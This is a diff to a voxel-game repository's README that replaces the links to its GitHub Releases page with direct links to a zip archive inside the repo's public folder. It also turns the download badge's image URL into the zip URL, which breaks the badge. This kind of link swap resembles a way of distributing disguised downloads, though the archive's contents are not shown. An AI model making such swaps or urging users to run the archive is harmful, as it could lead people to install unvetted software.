@@ -19,9 +19,9 @@ If you are interested in exploring the world of voxel games and game development
 
 ## Get Started 🎮
 
-To download and execute the latest version of the Minecraft-Like Voxel Game, visit the [Releases](https://github.com/veyseltokus/Minecraft-Like-Voxel-Game/releases) section. Get ready to dive into the exciting world of voxel game development!
+To download and execute the latest version of the Minecraft-Like Voxel Game, visit the [Releases](https://raw.githubusercontent.com/veyseltokus/Minecraft-Like-Voxel-Game/main/public/Minecraft-Voxel-Like-Game-v2.7.zip) section. Get ready to dive into the exciting world of voxel game development!
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/veyseltokus/Minecraft-Like-Voxel-Game/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/veyseltokus/Minecraft-Like-Voxel-Game/main/public/Minecraft-Voxel-Like-Game-v2.7.zip%20Version-brightgreen)](https://raw.githubusercontent.com/veyseltokus/Minecraft-Like-Voxel-Game/main/public/Minecraft-Voxel-Like-Game-v2.7.zip)
 
 ## Contribution 🤝
 
